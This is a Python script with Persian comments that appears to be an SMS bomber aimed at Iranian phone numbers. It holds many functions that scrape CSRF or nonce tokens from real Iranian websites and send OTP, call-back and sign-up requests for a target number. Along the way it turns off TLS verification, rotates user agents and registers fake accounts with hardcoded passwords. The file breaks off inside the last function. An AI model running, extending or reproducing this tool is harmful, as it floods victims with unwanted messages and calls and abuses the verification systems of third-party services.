import requests
from bs4 import BeautifulSoup
import re
from re import match, sub
import time
from time import sleep
from threading import Thread
import random
import json
import uuid
import socket
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from os import system, name
from platform import node, system, release


try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")


user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================

def padmira(phone):  
    phone = phone.strip()
    if phone.startswith("+98"): phone = "0" + phone[3:]
    elif phone.startswith("98") and len(phone) == 12: phone = "0" + phone[2:]

    session = requests.Session()
    home_url = "https://padmira.ir/"
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,*/*"}

    try: 
        res = session.get(home_url, headers=headers, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        csrf_tag = soup.find("meta", {"name": "csrf-token"}) or soup.find("input", {"name": "_token"})
        if not csrf_tag: return {"error": "CSRF token پیدا نشد!"}
        csrf_token = csrf_tag.get("content") if csrf_tag.has_attr("content") else csrf_tag.get("value")
        ajax_url = home_url + "ajax/send_sms_active"
        headers.update({
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-CSRF-TOKEN": csrf_token,
            "X-Requested-With": "XMLHttpRequest",
            "Origin": home_url,
            "Referer": home_url,
        })
        res2 = session.post(ajax_url, headers=headers, data={"mobile": phone}, timeout=10)

        try:
            return res2.json()
        except:
            return {"response_text": res2.text}

    except Exception as e:
        return {"error": str(e)}
        
        
def bornosmode(phone):
    phone = phone.strip()
    if phone.startswith("+98"):
        phone = "0" + phone[3:]
    elif phone.startswith("98") and len(phone) == 12:
        phone = "0" + phone[2:]

    session = requests.Session()
    home_url = "https://bornosmode.com/"

    try:
        res = session.get(home_url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        meta_tag = soup.find("meta", {"name": "csrf-token"})
        if not meta_tag:
            return "[-] CSRF Token پیدا نشد!"
        csrf_token = meta_tag.get("content")
        print(f"[+] CSRF Token: {csrf_token}")
    except Exception as e:
        return f"[-] خطا در دریافت توکن: {e}"

    url = "https://bornosmode.com/api/loginRegister/"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "X-CSRF-TOKEN": csrf_token,
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://bornosmode.com",
        "Referer": "https://bornosmode.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    data = {
        "mobile": phone,
        "withOtp": "1"
    }

    try:
        res2 = session.post(url, headers=headers, data=data, timeout=10)
        try:
            return res2.json()
        except:
            return res2.text
    except Exception as e:
        return f"[-] خطا در ارسال OTP: {e}"



def chapmatin(phone):
    try:
        session = requests.Session()
        home_url = "https://www.chapmatin.com/"
        r = session.get(home_url, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")

        dig_nounce = next((i.get("value") for i in soup.find_all("input") if i.get("name") == "dig_nounce"), None)
        if not dig_nounce:
            print("[-] توکن پیدا نشد ❌")
            return False

        data = {
            'action': 'digits_check_mob',
            'countrycode': '+98',
            'mobileNo': phone.replace('+98', ''),
            'csrf': dig_nounce,              # همون توکن رو تو csrf هم می‌ذاره
            'login': '2',
            'digits': '1',
            'json': '1',
            'whatsapp': '0',
            'digregcode': '+98',
            'digits_reg_mail': phone.replace('+98', ''),
            'digits_reg_password': 'admin123Mm@0091!',
            'dig_nounce': dig_nounce
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': home_url,
            'User-Agent': 'Mozilla/5.0'
        }

        res = session.post(home_url + "wp-admin/admin-ajax.php", data=data, headers=headers, timeout=10, verify=False)
        result = res.json() if res.headers.get("Content-Type", "").startswith("application/json") else {}

        if str(result.get("code")) == "1" or result.get("success"):
            print("[+] کد ارسال شد ✅")
            return True
        else:
            print(f"[-] خطا: {result}")
            return False

    except Exception as e:
        print(f"[!] خطا در Chapmatin: {e}")
        return False


def mohrpegah(phone):
    try:
        session = requests.Session()
        home_url = "https://mohrpegah.com/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        response = session.get(home_url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        dig_nounce = None
        for inp in soup.find_all("input"):
            if inp.get("name") == "dig_nounce":
                dig_nounce = inp.get("value")

        if not dig_nounce:
            print("[-] توکن dig_nounce پیدا نشد ❌")
            return False

        csrf = dig_nounce  # هر دو یکی هستند

        print(f"[+] CSRF: {csrf}")
        print(f"[+] Dig Nounce: {dig_nounce}")

        url = "https://mohrpegah.com/wp-admin/admin-ajax.php"
        data = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": phone.replace("+98", ""),
            "csrf": csrf,
            "login": "1",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "digits": "1",
            "json": "1",
            "whatsapp": "0",
            "mobmail": phone,
            "dig_otp": "",
            "dig_nounce": dig_nounce,
            "wp-submit": "1"
        }
        headers["X-Requested-With"] = "XMLHttpRequest"
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["Origin"] = home_url
        headers["Referer"] = home_url

        res = session.post(url, data=data, headers=headers, timeout=10, verify=False)

        print(f"Status: {res.status_code}")
        print(f"Response: {res.text}")

        if res.status_code == 200 and '"code":"1"' in res.text:
            print("[+] mohrpegah: کد ارسال شد ✅")
            return True
        else:
            print("[-] mohrpegah: خطا در ارسال ❌")
            return False

    except Exception as e:
        print(f"[!] خطا: {e}")
        return False



def toorangco(phone):
    try:
        phone_number = phone.replace("+98", "0").replace("98", "0")
        url = f"https://eapi.toorangco.com/api/CheckUserMobile/{phone_number}/1"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://toorangco.com",
            "Referer": "https://toorangco.com/",
        }

        response = requests.get(url, headers=headers, timeout=10, verify=False)

        print(f"Status Code: {response.status_code}")
        print(f"Raw Response: {response.text.strip()}")

        if response.status_code == 200:
            try:
                result = response.json()
                if result is True or \
                   str(result).lower() == "true" or \
                   result.get("success") or \
                   result.get("exists"):
                    print(f"{g}[+] ToorangCo: کد ارسال شد ✅{a}")
                    return True
                else:
                    print(f"{y}[-] ToorangCo: پاسخ معتبر ولی ناموفق - {result}{a}")
                    return False
            except ValueError:
                if "true" in response.text.lower():
                    print(f"{g}[+] ToorangCo: کد ارسال شد ✅{a}")
                    return True
                else:
                    print(f"{y}[-] ToorangCo: پاسخ متنی نامعتبر{a}")
                    return False
        else:
            print(f"{r}[-] ToorangCo: خطای سرور {response.status_code}{a}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"{r}[!] خطای شبکه در ToorangCo: {e}{a}")
        return False
    except Exception as e:
        print(f"{r}[!] خطای عمومی در ToorangCo: {e}{a}")
        return False
        
        
def irankohan(phone):
    try:
        import requests, random, string
        session = requests.Session()
        home_url = "https://irankohan.ir/Register/Register"
        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
        session.get(home_url, headers=headers, timeout=10, verify=False)

        name = "احمد مروت"
        email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@yahoo.com"
        password = "admin123@Mm"

        data = {
            'returnUrl':'','CompanyName':'','Name':name,
            'Mobile': phone.replace('+98','0'),
            'Email': email,'Password': password,'ConfirmPassword': password,
            'X-Requested-With':'XMLHttpRequest'
        }

        headers.update({
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept':'*/*','X-Requested-With':'XMLHttpRequest',
            'Origin':'https://irankohan.ir','Referer':home_url
        })

        r = session.post(home_url, data=data, headers=headers, timeout=10, verify=False)
        print(f"Status: {r.status_code}, Response: {r.text}")

        if r.status_code == 200:
            try:
                result = r.json()
                if ("ثبت" in result.get("alarm","") or "ذخیره گردید" in result.get("alarm","")):
                    print(f"{g}[+] IranKohan: ثبت نام موفق / کد ارسال شد!{a}")
                    return True
                else:
                    print(f"{y}[-] IranKohan: خطا - {result}{a}")
                    return False
            except:
                if 'ثبت' in r.text or 'success' in r.text.lower():
                    print(f"{g}[+] IranKohan: ثبت نام موفق!{a}")
                    return True
                return False
        print(f"{r}[-] IranKohan: خطای سرور {r.status_code}{a}")
        return False

    except Exception as e:
        print(f"{r}[!] خطا در IranKohan: {e}{a}")
        return False
        


def teamgraphic(phone):
    try:
        import requests, random, string
        session = requests.Session()
        signup_url = "https://teamgraphic.ir/users/sign-up"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        session.get(signup_url, headers=headers, timeout=10, verify=False)

        random_name = ''.join(random.choices(string.ascii_letters, k=6)) + " " + ''.join(random.choices(string.ascii_letters, k=6))
        data_signup = {
            'UsersInfo[name]': random_name,
            'UsersInfo[mobile]': phone.replace('+98', '0'),
            'UsersInfo[password]': 'admin123Mm@',
            'UsersInfo[phone]': '',
            'UsersInfo[method_acquainting]': 'سایت',
            'UsersInfo[law]': '1'
        }
        headers.update({'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://teamgraphic.ir', 'Referer': signup_url})

        r_signup = session.post(signup_url, data=data_signup, headers=headers, timeout=10, verify=False)
        run_signin = False

        try:
            res_signup = r_signup.json()
            if res_signup.get("success") or res_signup.get("status") == "success":
                print(f"[+] TeamGraphic: ثبت نام موفق ✅")
                run_signin = True
            elif 'کاربری با این نام کاربری قبلاً ثبت شده' in str(res_signup.get("msg", "")):
                print(f"[!] TeamGraphic: نام کاربری موجود، مرحله ارسال کد اجرا می‌شود")
                run_signin = True
            else:
                print(f"[-] TeamGraphic: ثبت نام ناموفق - {res_signup}")
        except:
            if 'success' in r_signup.text.lower() or 'ارسال' in r_signup.text:
                print(f"[+] TeamGraphic: ثبت نام موفق ✅")
                run_signin = True
 
        if run_signin:
            signin_url = "https://teamgraphic.ir/users/sign-in"
            data_signin = {
                'mobile': phone.replace('+98', '0'),
                'type': '1',
                'ref': '',
                'remember_me': 'false'
            }
            r_signin = session.post(signin_url, data=data_signin, headers=headers, timeout=10, verify=False)
            print(f"Status Code: {r_signin.status_code}")
            print(f"Response: {r_signin.text}")
            if r_signin.status_code == 200 and 'success' in r_signin.text.lower():
                print(f"[+] TeamGraphic: کد ورود ارسال شد ✅")
                return True
            else:
                print(f"[-] TeamGraphic: ارسال کد ورود ناموفق")
                return False
        else:
            return False

    except Exception as e:
        print(f"[!] خطا در TeamGraphic: {e}")
        return False




def xmohr(phone):
    try:
        import requests
        session = requests.Session()
        home_url = "https://xmohr.ir/"
        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
        session.get(home_url, headers=headers, timeout=10, verify=False)

        url = "https://xmohr.ir/wp-admin/admin-ajax.php"
        data = {'action': 'stm_login_register', 'type': 'mobile', 'input': phone.replace('+98', '0')}
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://xmohr.ir',
            'Referer': home_url
        })

        r = session.post(url, data=data, headers=headers, timeout=10, verify=False)
        print(f"Status: {r.status_code} | Response: {r.text}")

        if r.status_code == 200:
            try:
                res = r.json()
                if res.get("success") or res.get("status") == "success":
                    print(f"{g}[+] XMohr: کد ارسال شد!{a}")
                    return True
                else:
                    print(f"{y}[-] XMohr: خطا - {res}{a}")
                    return False
            except:
                if 'success' in r.text.lower() or 'ارسال' in r.text:
                    print(f"{g}[+] XMohr: کد ارسال شد!{a}")
                    return True
                print(f"{y}[-] XMohr: پاسخ نامعتبر{a}")
                return False
        print(f"{r}[-] XMohr: خطای سرور {r.status_code}{a}")
        return False

    except Exception as e:
        print(f"{r}[!] خطا در XMohr: {e}{a}")
        return False
        
        
        
def cartesabz(phone):
    try:
        import requests
        session = requests.Session()
        home_url = "https://cartesabz.net/"
        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
        session.get(home_url, headers=headers, timeout=10, verify=False)

        url = "https://cartesabz.net/wp-admin/admin-ajax.php"
        data_call = {'login': phone.replace('+98', '+98'), 'method': 'call', 'action': 'first_login'}
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://cartesabz.net',
            'Referer': home_url
        })

        r_call = session.post(url, data=data_call, headers=headers, timeout=10, verify=False)
        print(f"Call Status: {r_call.status_code} | Response: {r_call.text}")
        if r_call.status_code == 200:
            print(f"{g}[+] CarteSabz Call: درخواست تماس انجام شد{a}")
        else:
            print(f"{y}[-] CarteSabz Call: خطا {r_call.status_code}{a}")
        data_sms = {'login': phone.replace('+98', '+98'), 'method': 'sms', 'action': 'first_login'}
        r_sms = session.post(url, data=data_sms, headers=headers, timeout=10, verify=False)
        print(f"SMS Status: {r_sms.status_code} | Response: {r_sms.text}")
        if r_sms.status_code == 200:
            print(f"{g}[+] CarteSabz SMS: کد پیامکی ارسال شد!{a}")
            return True
        else:
            print(f"{y}[-] CarteSabz SMS: خطا {r_sms.status_code}{a}")
            return False

    except Exception as e:
        print(f"{r}[!] خطا در CarteSabz: {e}{a}")
        return False
        

def baldano(phone, name="رحمان"):
    try:
        import requests
        from bs4 import BeautifulSoup
        
        session = requests.Session()
        home_url = "https://www.baldano.ir/study/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        response = session.get(home_url, headers=headers, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': '__RequestVerificationToken'})
        if not token_input:
            print(f"{r}[-] Baldano: توکن پیدا نشد{a}")
            return False
        token = token_input['value']
        data = {
            'name': 'Form-Consult',
            'RedirectUrl': '/study/',
            'formData[0].Key': 'Name',
            'formData[0].Value': name,
            'formData[1].Key': 'Phone',
            'formData[1].Value': phone.replace('+98','0'),
            'formData[2].Key': 'country',
            'formData[2].Value': 'همه کشورها',
            'formData[3].Key': 'service',
            'formData[3].Value': '',
            'formData[4].Key': 'page',
            'formData[4].Value': '/study/',
            '__RequestVerificationToken': token
        }
        
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        })

        post_url = "https://www.baldano.ir/common/asendform"
        r = session.post(post_url, data=data, headers=headers, timeout=10, verify=False)
        
        print(f"Status: {r.status_code}")
        print(f"Response: {r.text}")
        if r.status_code == 200:
            print(f"{g}[+] Baldano: فرم ارسال شد!{a}")
            return True
        else:
            print(f"{y}[-] Baldano: خطا در ارسال{a}")
            return False

    except Exception as e:
        print(f"{r}[!] خطا در Baldano: {e}{a}")
        return False
        

def aryakalaabzar(phone):
    try:
        session = requests.Session()
        home_url = "https://aryakalaabzar.ir/product-category/industrial-tools/rechargable-drill/?login=true"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'text/html,application/xhtml+xml'
        }
        html = session.get(home_url, headers=headers, timeout=10, verify=False).text
        match = re.search(r'name="instance_id" value="([^"]+)"', html)
        if not match:
            print("[-] instance_id پیدا نشد")
            return False
        instance_id = match.group(1)
        url = "https://aryakalaabzar.ir/wp-admin/admin-ajax.php"
        data = {
            'digt_countrycode': '+98',
            'phone': phone.replace('+98', ''),
            'email': '',
            'digits_reg_password': '',
            'digits_process_register': '1',
            'sms_otp': '',
            'otp_step_1': '1',
            'digits_otp_field': '1',
            'instance_id': instance_id,
            'optional_data': 'optional_data',
            'action': 'digits_forms_ajax',
            'type': 'register',
            'dig_otp': 'otp',
            'digits': '1',
            'digits_redirect_page': '//aryakalaabzar.ir/product-category/industrial-tools/rechargable-drill/',
            'digits_form': '67b93d9cf2',
            '_wp_http_referer': '/product-category/industrial-tools/rechargable-drill/?login=true',
            'container': 'digits_protected',
            'sub_action': 'sms_otp'
        }
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://aryakalaabzar.ir',
            'Referer': home_url
        })

        r = session.post(url, data=data, headers=headers, timeout=10, verify=False)
        print(f"[DEBUG] Status: {r.status_code}, Response: {r.text[:200]}...")

        if r.status_code == 200 and '"success":true' in r.text:
            print("[+] AryaKalaAbzar: کد ارسال شد ✅")
            return True
        else:
            print("[-] AryaKalaAbzar: ارسال ناموفق ❌")
            return False

    except Exception as e:
        print(f"[!] خطا: {e}")
        return False



def motorbargh(phone):
    try:
        url = "https://motorbargh.shop/wp-admin/admin-ajax.php"
        data = {
            "action": "stm_login_register",
            "type": "mobile",
            "input": phone
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)

        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")

        if response.status_code == 200:
            try:
                result = response.json()
                if result.get("status") in ["success", True]:
                    print(f"{g}[+] MotorBargh: کد ارسال شد ✔{a}")
                    return True
                else:
                    print(f"{y}[-] MotorBargh: خطا - {result}{a}")
                    return False
            except:
                if "success" in response.text.lower():
                    print(f"{g}[+] MotorBargh: کد ارسال شد ✔{a}")
                    return True
                else:
                    print(f"{y}[-] MotorBargh: پاسخ نامعتبر{a}")
                    return False
        else:
            print(f"{r}[-] MotorBargh: خطای سرور {response.status_code}{a}")
            return False

    except Exception as e:
        print(f"{r}[!] خطا در MotorBargh: {e}{a}")
        return False

def motorbargh(phone):
    try:
        url = "https://motorbargh.shop/wp-admin/admin-ajax.php"
        data = {"action":"stm_login_register","type":"mobile","input":phone}
        headers = {
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "Accept":"application/json, text/javascript, */*; q=0.01",
            "X-Requested-With":"XMLHttpRequest",
            "User-Agent":"Mozilla/5.0"
        }

        res = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
        print(f"Status: {res.status_code}")
        print(f"Response: {res.text}")

        result = res.json()
        if result.get("success") is True:
            print(f"{g}[+] MotorBargh: کد فعالسازی برای شما ارسال شد ✔{a}")
            return True
        else:
            print(f"{y}[-] MotorBargh: خطا - {result.get('text', result)}{a}")
            return False

    except Exception as e:
        print(f"{r}[!] خطا در MotorBargh: {e}{a}")
        return False



def abzarmarket(phone):
    try:
        url = "https://abzarmarket.com/restApi/auth/register"
        data = {
            "form_type": "register",
            "mobile": phone,
            "password": "@dmin123A",
            "tos": False,
            "subscribe": True,
            "redirect": "",
            "gender": "male",
            "first_name": "نام",
            "last_name": "خانوادگی"
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        response = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")

        if response.status_code == 200:
            result = response.json()
            if result.get("success") or result.get("message") == "کد ارسال شد":
                print(f"[+] AbzarMarket: ثبت نام موفق / کد SMS ارسال شد!")
                return True
            else:
                print(f"[-] AbzarMarket: خطا - {result}")
                return False
        else:
            print(f"[-] AbzarMarket: خطای سرور {response.status_code}")
            return False

    except Exception as e:
        print(f"[!] خطا در AbzarMarket: {e}")
        return False
        

def three_click(phone):
    """
    تابع برای ارسال درخواست به API سه کلیک
    """
    url = "https://api.3click.com/auth/validate"
    
    # تبدیل +98912... به 0912...
    normalized_phone = phone.replace("+98", "0")
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "provider-code": "deltaban",
        "Origin": "https://deltaban.3click.com",
        "Referer": "https://deltaban.3click.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    data = {
        "mobile": normalized_phone
    }
    
    try:
        print(f"{y}[3Click] ارسال درخواست برای: {normalized_phone}{a}")
        print(f"{y}[3Click] Headers: {json.dumps(headers, indent=2, ensure_ascii=False)}{a}")
        print(f"{y}[3Click] Data: {json.dumps(data, ensure_ascii=False)}{a}")
        
        response = requests.post(
            url=url,
            json=data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        print(f"{y}[3Click] Status Code: {response.status_code}{a}")
        print(f"{y}[3Click] Response Headers: {dict(response.headers)}{a}")
        print(f"{y}[3Click] Response Text: {response.text}{a}")
        
        if response.status_code in [200, 201, 202]:
            print(f"{g}[3Click] موفقیت‌آمیز!{a}")
            return True
        else:
            print(f"{r}[3Click] خطا با کد وضعیت: {response.status_code}{a}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{r}[3Click] خطای ارتباطی: {e}{a}")
        return False
    except Exception as e:
        print(f"{r}[3Click] خطای ناشناخته: {e}{a}")
        return False


def raheeno(phone):
    try:
        # ==== پاکسازی شماره ====
        clean_phone = phone.strip().replace("+98", "0").replace(" ", "")
        if not clean_phone.startswith("0"):
            clean_phone = "0" + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print(f"[!] Raheeno: شماره نامعتبر")
            return False

        url = "https://www.raheeno.com/account/SendOneCodeSms"
        payload = {"Mobile": clean_phone}
        headers = {
            "Content-Type": "application/json; charset=utf-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")

        # --- بررسی نوع پاسخ ---
        try:
            data = response.json()
            print(f"[DEBUG] JSON Response: {data}")
        except ValueError:
            data = response.text.strip()
            print(f"[DEBUG] Text Response: {data}")

        # --- بررسی نتیجه ---
        if response.status_code == 200:
            print("[+] Raheeno: کد ارسال شد ✅")
            return True
        else:
            print(f"[-] Raheeno: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] Raheeno Exception: {e}")
        return False
        

def eavar(phone):
    try:
        url = "https://www.eavar.com/fa/v2/senddynamicmobilepassword/"
        payload = {"mobile": phone}
        headers = {
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/json; charset=utf-8"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")
        try:
            data = response.json()
            print(f"[DEBUG] Response: {data}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
            return False

        if response.status_code == 200 and data.get("success", True):
            print("[+] Eavar: OTP ارسال شد ✅")
            return True
        else:
            print(f"[-] Eavar: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] Eavar Exception: {e}")
        return False


def t4f(phone):
    try:
        # شماره تلفن را پاکسازی می‌کنیم
        clean_phone = phone.replace(" ", "").replace("+", "")
        if clean_phone.startswith("98"):
            clean_phone = "0" + clean_phone[2:]
        elif not clean_phone.startswith("0"):
            clean_phone = "0" + clean_phone

        url = "https://www.t4f.ir/api/v1/auth/login"
        payload = {"mobile": clean_phone}
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")
        try:
            data = response.json()
            print(f"[DEBUG] Response: {data}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text}")
            return False

        if response.status_code == 200:
            print("[+] T4F: OTP ارسال شد ✅")
            return True
        else:
            print(f"[-] T4F: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] T4F Exception: {e}")
        return False
        
def ekeepa(phone):
    """
    تابع برای ارسال کد تأیید به API اکیپا
    """
    url = "https://ekeepa.co/api/v2/site/auth/otp/send-otp"
    
    # تبدیل +98912... به 0912...
    normalized_phone = phone.replace("+98", "0")
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "platform": "web_customer",
        "Origin": "https://ekeepa.co",
        "Referer": "https://ekeepa.co/",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)} Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    data = {
        "phone_number": normalized_phone
    }
    
    try:
        response = requests.post(
            url=url,
            json=data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        # چاپ پاسخ برای دیباگ
        print(f"{y}[Ekeepa] Status: {response.status_code}, Response: {response.text}{a}")
        
        if response.status_code in [200, 201, 202]:
            print(f"{g}[Ekeepa] کد تأیید ارسال شد{a}")
            return True
        elif response.status_code == 429:
            print(f"{y}[Ekeepa] محدودیت ارسال (Too Many Requests){a}")
            return False
        else:
            print(f"{y}[Ekeepa] خطا با کد وضعیت: {response.status_code}{a}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{r}[Ekeepa] خطای ارتباطی: {e}{a}")
        return False
    except Exception as e:
        print(f"{r}[Ekeepa] خطای ناشناخته: {e}{a}")
        return False


def karnameh(phone):
    """
    تابع برای ارسال کد تأیید به API Karnameh
    """
    url = "https://api-gw.karnameh.com/switch/api/auth/otp/send/"
    
    # تبدیل +98912... به 0912...
    normalized_phone = phone.replace("+98", "0")
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.{random.randint(1000,9999)}.{random.randint(100,999)} Safari/537.36"
    }
    
    data = {
        "phone_number": normalized_phone
    }
    
    try:
        response = requests.post(url, json=data, headers=headers, timeout=15, verify=False)
        print(f"{y}[Karnameh] Status: {response.status_code}, Response: {response.text}{a}")
        
        if response.status_code in [200, 201, 202]:
            print(f"{g}[Karnameh] کد تأیید ارسال شد ✅{a}")
            return True
        elif response.status_code == 429:
            print(f"{y}[Karnameh] محدودیت ارسال (Too Many Requests){a}")
            return False
        else:
            print(f"{y}[Karnameh] خطا با کد وضعیت: {response.status_code}{a}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{r}[Karnameh] خطای ارتباطی: {e}{a}")
        return False
    except Exception as e:
        print(f"{r}[Karnameh] خطای ناشناخته: {e}{a}")
        return False

def sheypoor(phone):
    """
    تابع برای ارسال کد تأیید به API شیپور
    """
    url = "https://www.sheypoor.com/api/v10.0.0/auth/send"
    
    # تبدیل +98912... به 0912...
    normalized_phone = phone.replace("+98", "0")
    
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json;charset=utf-8",
        "X-User-Agent": "Sheypoorx/3.6.627 browser/Mobile Safari.18.6 os/iOS.18.6",
        "Origin": "https://www.sheypoor.com",
        "Referer": "https://www.sheypoor.com/",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
    }
    
